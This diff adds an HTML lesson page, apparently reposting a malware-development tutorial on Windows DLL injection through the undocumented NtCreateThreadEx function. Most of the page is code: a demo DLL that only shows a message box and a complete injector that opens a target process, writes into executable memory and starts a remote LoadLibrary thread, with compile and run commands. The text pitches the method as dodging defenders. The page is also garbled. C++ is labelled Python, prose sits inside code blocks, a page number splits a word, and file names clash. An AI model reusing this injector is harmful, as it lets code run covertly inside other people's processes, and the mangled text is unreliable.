@@ -1,0 +1,233 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>DLL injection via undocumented NtCreateThreadEx. Simple</title><link rel="stylesheet" href="../../content.css"><script src="../../content.js" defer></script></head><body><main class="lesson">
+    <div class="p-4 sm:p-5 my-6 rounded-2xl bg-[var(--accent-soft)] border border-[var(--accent)] text-[#f0f3ff] flex items-start gap-3 shadow-2xl">
+        <i data-lucide="book-marked" class="w-5 h-5 text-[var(--accent)] flex-shrink-0 mt-0.5"></i>
+        <div class="text-xs sm:text-sm leading-relaxed space-y-1">
+            <div class="font-bold text-[var(--accent)] uppercase tracking-wide">MD-MZ Research Field Note #9</div>
+            <div class="text-[#e2e8f0]">Technical research note on <strong class="text-white">DLL injection via undocumented NtCreateThreadEx. Simple</strong> covering source code implementations, evasion mechanics, and practical attack surface analysis.</div>
+        </div>
+    </div>
+    <p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">C++ example.</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">In the previous sections I wrote about classic DLL injection via <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code>, via SetWindowsHookEx. Today I’ll consider another DLL injection technique. Its meaning is that we are using an undocumented function <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtCreateThreadEx</code>. So let’s go to show how to inject malicious DLL into the remote process by leveraging a Win32API functions <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code>, <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code>, WaitForSingleObject and an officially undocumented Native API <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtCreateThreadEx</code>. First of all, let’s take a look at example C++ source code of our malicious DLL (evil.c):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+DLL example for DLL injection via NtCreateThreadEx
+author: @cocomelonc
+https://cocomelonc.github.io/pentest/2021/12/06/malware-injection-9.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+BOOL APIENTRY DllMain(HMODULE hModule,
+DWORD ul_reason_for_call, LPVOID lpReserved) {
+switch (ul_reason_for_call) {
+case DLL_PROCESS_ATTACH:
+MessageBox(
+NULL,
+"Meow-meow!",
+
+"=^..^=",
+MB_OK
+);
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
+}
+As usually, it’s pretty simple. Just pop-up “Meow-meow!”.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to compile our DLL:</p>
+
+            <div class="my-4 rounded-xl overflow-hidden border border-[#212b54] bg-[#070a15] font-mono text-xs shadow-md">
+                <div class="px-3.5 py-1.5 bg-[#0d132b] text-[10px] text-[#cbd5e1] font-bold uppercase flex items-center gap-1.5 border-b border-[#1c243f]">
+                    <i data-lucide="terminal" class="w-3.5 h-3.5 text-[var(--accent)]"></i>
+                    <span>Terminal / Compilation Command</span>
+                </div>
+                <pre class="p-3.5 text-[#9ff0d0] overflow-x-auto leading-relaxed"><code class="language-bash">x86_64-w64-mingw32-gcc -shared -o evil.dll evil.c</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, let’s take a look to the source code of our malware (hack.cpp):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>Python 3</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-python">/*
+hack.cpp
+DLL injection via undocumented NtCreateThreadEx example
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/12/06/malware-injection-9.html
+*/
+#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;vector&gt;
+#pragma comment(lib, "advapi32.lib")
+typedef NTSTATUS(NTAPI* pNtCreateThreadEx) (
+OUT PHANDLE hThread,
+
+IN ACCESS_MASK DesiredAccess,
+IN PVOID ObjectAttributes,
+IN HANDLE ProcessHandle,
+IN PVOID lpStartAddress,
+IN PVOID lpParameter,
+IN ULONG Flags,
+IN SIZE_T StackZeroBits,
+IN SIZE_T SizeOfStackCommit,
+IN SIZE_T SizeOfStackReserve,
+OUT PVOID lpBytesBuffer
+);
+// get process PID
+int findMyProc(const char *procname) {
+HANDLE hSnapshot;
+PROCESSENTRY32 pe;
+int pid = 0;
+BOOL hResult;
+// snapshot of all processes in the system
+hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+if (INVALID_HANDLE_VALUE == hSnapshot) return 0;
+// initializing size: needed for using Process32First
+pe.dwSize = sizeof(PROCESSENTRY32);
+// info about first process encountered in a system snapshot
+hResult = Process32First(hSnapshot, &amp;pe);
+// retrieve information about the processes
+// and exit if unsuccessful
+while (hResult) {
+// if we find the process: return process ID
+if (strcmp(procname, pe.szExeFile) == 0) {
+pid = pe.th32ProcessID;
+break;
+}
+hResult = Process32Next(hSnapshot, &amp;pe);
+}
+// closes an open handle (CreateToolhelp32Snapshot)
+CloseHandle(hSnapshot);
+return pid;
+}
+
+int main(int argc, char* argv[]) {
+DWORD pid = 0; // process ID
+HANDLE ph; // process handle
+HANDLE ht; // thread handle
+LPVOID rb; // remote buffer
+SIZE_T rl; // return length
+char evilDll[] = "evil.dll";
+int evilLen = sizeof(evilDll) + 1;
+HMODULE hKernel32 = GetModuleHandle("Kernel32");
+LPTHREAD_START_ROUTINE lb =
+(LPTHREAD_START_ROUTINE) GetProcAddress(
+hKernel32, "LoadLibraryA");
+pNtCreateThreadEx ntCTEx = (pNtCreateThreadEx)GetProcAddress(
+GetModuleHandle("ntdll.dll"), "NtCreateThreadEx");
+if (ntCTEx == NULL) {
+CloseHandle(ph);
+printf("NtCreateThreadEx failed :( exiting...\n");
+return -2;
+}
+pid = findMyProc(argv[1]);
+if (pid == 0) {
+printf("PID not found :( exiting...\n");
+return -1;
+} else {
+printf("PID = %d\n", pid);
+ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);
+if (ph == NULL) {
+printf("OpenProcess failed :( exiting...\n");
+return -2;
+}
+// allocate memory buffer for remote process
+rb = VirtualAllocEx(ph, NULL, evilLen,
+MEM_RESERVE | MEM_COMMIT,
+PAGE_EXECUTE_READWRITE);
+// write payload to memory buffer
+WriteProcessMemory(ph, rb, evilDll, evilLen, rl); // NULL);
+ntCTEx(&amp;ht, 0x1FFFFF, NULL, ph,
+
+(LPTHREAD_START_ROUTINE) lb, rb,
+FALSE, NULL, NULL, NULL, NULL);
+if (ht == NULL) {
+CloseHandle(ph);
+printf("ThreadHandle failed :( exiting...\n");
+return -2;
+} else {
+printf("successfully inject via NtCreateThreadEx :)\n");
+}
+WaitForSingleObject(ht, INFINITE);
+CloseHandle(ht);
+CloseHandle(ph);
+}
+return 0;
+}
+Let’s go to investigate this code logic. As you can see, firstly, I used a function
+FindMyProc from one of my past posts. It’s pretty simple, basically, what it does, it
+takes the name of the process we want to inject to and try to find it in a memory of the
+operating system, and if it exists, it’s running, this function return a process ID of that
+process.
+Then, in main function our logic is same as in my classic DLL injection post. The only</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">difference is we use <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtCreateThreadEx</code> function instead <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code>:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As shown in this code, the Windows API call can be replaced with Native API call func169</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">tions. For example, <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">VirtualAllocEx</code> can be replace with <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">NtAllocateVirtualMemory</code>, <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">WriteProcessMemory</code> can be replaces with NtWriteProcessMemory. The downside to this method is that the function is undocumented so it may change in the future. But there is a caveat. Let’s go to create simple code for our “victim” process (mouse.c):</p>
+
+            <div class="my-6 rounded-2xl overflow-hidden border border-[#26335e] bg-[#070b1c] shadow-2xl font-mono text-xs">
+                <div class="flex items-center justify-between px-4 py-2.5 bg-[#0d1430] border-b border-[#212b54]">
+                    <div class="flex items-center gap-2 text-[var(--accent)] font-semibold text-xs tracking-wider uppercase">
+                        <i data-lucide="code-xml" class="w-3.5 h-3.5"></i>
+                        <span>C / C++ Source</span>
+                    </div>
+                    <button onclick="copyCode(this)" class="flex items-center gap-1.5 px-3 py-1 rounded-lg bg-[var(--accent-soft)] hover:opacity-90 border border-[var(--accent)] text-[var(--accent)] font-semibold text-xs transition">
+                        <i data-lucide="copy" class="w-3.5 h-3.5"></i>
+                        <span>Copy</span>
+                    </button>
+                </div>
+                <pre class="p-4 overflow-x-auto text-[#f8fafc] leading-relaxed font-mono"><code class="language-c">/*
+hack.cpp
+victim process source code for DLL injection via NtCreateThreadEx
+author: @cocomelonc
+https://cocomelonc.github.io/tutorial/
+2021/12/06/malware-injection-9.html
+*/
+#include &lt;windows.h&gt;
+#pragma comment (lib, "user32.lib")
+int main() {
+MessageBox(NULL, "Squeak-squeak!", "&lt;:( )~~", MB_OK);
+return 0;
+}
+As you can see, the logic is simplest, I’s just pop-up Squeak-squeak! message. Let’s
+go to compile:
+x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \
+-fpermissive
+
+And check:
+
+So everything is worked perfectly.</code></pre>
+            </div>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Let’s go to inject our malicious DLL to this process. Compile hack.cpp: x86_64-w64-mingw32-g++ hack.cpp -o hack.exe -mconsole \ -I/usr/share/mingw-w64/include/ -s -ffunction-sections \ -fdata-sections -Wno-write-strings -fno-exceptions \ -fmerge-all-constants -static-libstdc++ -static-libgcc \ -fpermissive</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">Then, run process hacker 2:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, the highlighted process is our victim mouse.exe. Let’s run our simple malware: .\hack.exe mouse.exe</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see our malware is correctly found process ID of victim. Let’s go to investigate properties of our victim process PID: 3884:</p>
+<p class="my-3 sm:my-4 text-[#e2e8f0] leading-relaxed text-sm sm:text-base">As you can see, our malicious DLL successfully injected as expected! But why we are not injecting to the another process like notepad.exe or svchost.exe? I read about Session Separation and I think it is reason of my problem so I have one question: How I can hacking Windows 10 :) The reason why it’s good to have this technique in your arsenal is because we are not using <code class="px-1.5 py-0.5 rounded bg-[#101738] border border-[#2c3a6e] text-[var(--accent)] font-mono text-xs font-semibold">CreateRemoteThread</code> which is more popular and suspicious and which is more closely investigated by the blue teamers. I hope this post spreads awareness to the blue teamers of this interesting technique, and adds a weapon to the red teamers arsenal. Session Separation source code in Github</p></main></body></html>
